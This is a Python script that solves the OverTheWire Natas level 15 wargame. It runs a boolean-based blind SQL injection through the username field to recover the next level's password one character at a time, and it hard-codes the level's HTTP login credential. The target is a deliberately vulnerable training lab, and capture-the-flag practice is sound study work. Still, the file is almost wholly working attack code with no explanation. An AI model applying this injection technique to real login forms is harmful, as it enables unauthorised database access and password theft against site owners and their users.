import requests
from requests.auth import HTTPBasicAuth
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

print("filtering characters for bruteforce:\n-----------------------------")
for char in chars:
    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'), data = Data)
    if 'exists' in r.text :
        filtered = filtered + char
        print(char, "validated")
    else:
        print(char, "filtered")

print("characters after filtering =",filtered)

print("\nstarting bruteforce:\n-----------------------------")
flag = 0
for i in range(0,34):
    for char in filtered:
        flag = 0
        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'), data = Data)
        if 'exists' in r.text :
            passwd = passwd + char
            s = (34-i)*'='
            print(passwd, f"found match {s}>")
            flag = 1
            break
        else:
            print(passwd + char, "not match")
    if flag==0:
        break
if passwd == '':
    print("change code input characters or the password is nothing...")
else:
    print("\n-----------------------------\npassword is", passwd,"\n-----------------------------")